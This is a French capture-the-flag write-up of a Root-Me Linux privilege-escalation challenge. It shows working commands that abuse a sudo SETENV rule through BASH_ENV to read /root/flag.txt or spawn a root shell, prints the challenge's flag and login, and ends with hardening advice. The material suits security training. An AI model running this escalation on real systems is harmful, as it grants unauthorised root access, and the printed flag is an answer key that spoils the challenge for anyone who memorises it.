# Linux Privesc - SETENV (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32203
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32203
```

---

## Objectif

Un script de maintenance nettoie `/tmp`. L'administrateur a configuré des permissions sudo spéciales. Exploiter ces permissions pour lire `/root/flag.txt`.

---

## Reconnaissance

### Vérification des permissions sudo

```bash
user@challenge:~$ sudo -l
Matching Defaults entries for user on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User user may run the following commands on challenge:
    (root) SETENV: NOPASSWD: /opt/clean_tmp.sh
```

### Analyse de la configuration

```
(root) SETENV: NOPASSWD: /opt/clean_tmp.sh
       │       │         └── Script autorisé
       │       └── Sans mot de passe
       └── VULNÉRABILITÉ! Permet de passer des variables d'environnement
```

### Contenu du script

```bash
user@challenge:~$ cat /opt/clean_tmp.sh
#!/bin/bash

PATH=/usr/bin:/bin:/usr/sbin:/sbin

echo "Current size of the /tmp directory:"
du -sh /tmp

size_in_bytes=$(du -sb /tmp | cut -f1)
size_in_mb=$((size_in_bytes / 1024 / 1024))

echo "Size in Mo: $size_in_mb Mo"

if [ $size_in_mb -gt 10 ]; then
    echo "/tmp directory exceeds 10 Mo, cleaning in progress..."
    find /tmp -type f -mtime +1 -delete
    echo "Cleaning completed."
else
    echo "/tmp directory size is less than 10 Mo, no cleaning necessary."
fi

exit 0
```

**Point clé :** Le script utilise `#!/bin/bash` (bash, pas sh)

---

## Vulnérabilité : SETENV + BASH_ENV

### Qu'est-ce que SETENV ?

Le tag `SETENV` dans sudoers permet à l'utilisateur de **passer des variables d'environnement** lors de l'exécution sudo, même si `env_reset` est activé.

```bash
# Sans SETENV
sudo VAR=value /script  # VAR est supprimée par env_reset

# Avec SETENV
sudo VAR=value /script  # VAR est CONSERVÉE
```

### Qu'est-ce que BASH_ENV ?

`BASH_ENV` est une variable spéciale de bash. Quand bash démarre en mode **non-interactif** (scripts), il exécute le fichier spécifié par `BASH_ENV` AVANT le script.

```
┌─────────────────────────────────────┐
│ bash /script.sh                     │
├─────────────────────────────────────┤
│ 1. Lit BASH_ENV                     │
│ 2. Source le fichier BASH_ENV       │ ← Notre code malveillant
│ 3. Exécute script.sh                │
└─────────────────────────────────────┘
```

---

## Exploitation

### Étape 1 : Créer le script malveillant

```bash
user@challenge:~$ echo "cat /root/flag.txt > /tmp/flag.out; chmod 777 /tmp/flag.out" > /tmp/pwn.sh
```

### Étape 2 : Exploiter via BASH_ENV

```bash
user@challenge:~$ sudo BASH_ENV=/tmp/pwn.sh /opt/clean_tmp.sh
Current size of the /tmp directory:
12K	/tmp
Size in Mo: 0 Mo
/tmp directory size is less than 10 Mo, no cleaning necessary.
```

### Étape 3 : Lire le flag

```bash
user@challenge:~$ cat /tmp/flag.out
RM{0357a90219ab8eb0319c3956175b33db}
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│                    CONFIGURATION SUDO                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  (root) SETENV: NOPASSWD: /opt/clean_tmp.sh                 │
│         │                                                   │
│         └── Permet de passer des variables d'environnement  │
│                                                             │
│  /opt/clean_tmp.sh:                                         │
│  #!/bin/bash  ← BASH! (pas sh)                              │
│  ...                                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    CRÉATION PAYLOAD                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /tmp/pwn.sh:                                               │
│  cat /root/flag.txt > /tmp/flag.out                         │
│  chmod 777 /tmp/flag.out                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    EXPLOITATION                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  sudo BASH_ENV=/tmp/pwn.sh /opt/clean_tmp.sh                │
│       │                    │                                │
│       │                    └── Script bash autorisé         │
│       │                                                     │
│       └── BASH_ENV passé grâce à SETENV                     │
│                                                             │
│  Séquence d'exécution:                                      │
│  1. sudo lance bash pour exécuter /opt/clean_tmp.sh         │
│  2. Bash lit BASH_ENV=/tmp/pwn.sh                           │
│  3. Bash SOURCE /tmp/pwn.sh (en tant que ROOT!)             │
│  4. Notre commande s'exécute avec les droits root           │
│  5. Puis le script clean_tmp.sh s'exécute normalement       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    FLAG CAPTURÉ                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  RM{0357a90219ab8eb0319c3956175b33db}                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{0357a90219ab8eb0319c3956175b33db}
```

---

## Variables d'environnement exploitables

| Variable | Shell | Description |
|----------|-------|-------------|
| `BASH_ENV` | bash | Script sourcé au démarrage (non-interactif) |
| `ENV` | sh/dash | Équivalent de BASH_ENV pour sh |
| `SHELLOPTS` | bash | Options shell |
| `PS4` | bash | Prompt de debug (avec `set -x`) |
| `BASH_FUNC_*` | bash | Fonctions exportées |

### Alternative avec shell interactif

Pour obtenir un shell root :

```bash
# Créer un script qui lance un shell
echo "/bin/bash -p" > /tmp/pwn.sh

# Exploiter
sudo BASH_ENV=/tmp/pwn.sh /opt/clean_tmp.sh
# On obtient un shell root
```

---

## Différence SETENV vs env_keep

| Mécanisme | Description | Risque |
|-----------|-------------|--------|
| `env_keep` | Variables TOUJOURS préservées | Affecte toutes les commandes |
| `SETENV` | Variables passées SI spécifiées | Contrôle par commande |

```bash
# env_keep+=VAR
sudo /bin/ls          # VAR est préservée automatiquement

# SETENV
sudo VAR=val /bin/ls  # VAR doit être explicitement passée
sudo /bin/ls          # VAR n'est PAS préservée
```

---

## Comment se protéger

### 1. Ne pas utiliser SETENV

```bash
# MAUVAIS
user ALL=(root) SETENV: NOPASSWD: /opt/script.sh

# BON
user ALL=(root) NOPASSWD: /opt/script.sh
```

### 2. Utiliser NOSETENV explicitement

```bash
# Interdit explicitement le passage de variables
user ALL=(root) NOSETENV: NOPASSWD: /opt/script.sh
```

### 3. Nettoyer les variables dans le script

```bash
#!/bin/bash
# Au début du script
unset BASH_ENV
unset ENV
unset SHELLOPTS
```

### 4. Utiliser /bin/sh au lieu de bash

```bash
#!/bin/sh
# sh (dash) n'utilise pas BASH_ENV
```

---

## Commandes utiles

```bash
# Vérifier les permissions sudo
sudo -l

# Chercher SETENV dans sudoers
sudo grep -r "SETENV" /etc/sudoers /etc/sudoers.d/ 2>/dev/null

# Tester BASH_ENV localement
BASH_ENV=/tmp/test.sh bash -c 'echo hello'

# Voir le shebang d'un script
head -1 /opt/script.sh

# Différence bash vs sh
ls -la /bin/sh  # Souvent un lien vers dash
```

---

## Pourquoi ça fonctionne

### Condition 1 : SETENV

```
(root) SETENV: /opt/clean_tmp.sh
       └── Permet de passer BASH_ENV via sudo
```

### Condition 2 : Script bash

```bash
#!/bin/bash  ← Bash lit BASH_ENV
```

Si c'était `#!/bin/sh`, BASH_ENV ne serait pas lu.

### Condition 3 : Mode non-interactif

BASH_ENV n'est lu que quand bash est lancé en mode **non-interactif** (scripts), pas pour les shells interactifs.

---

## Ressources

- [Bash Manual - BASH_ENV](https://www.gnu.org/software/bash/manual/bash.html#Bash-Startup-Files)
- [Sudoers Manual - SETENV](https://www.sudo.ws/man/sudoers.man.html)
- [HackTricks - Sudo Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)
- `man bash` - Section "INVOCATION"
- `man sudoers` - Tags SETENV/NOSETENV
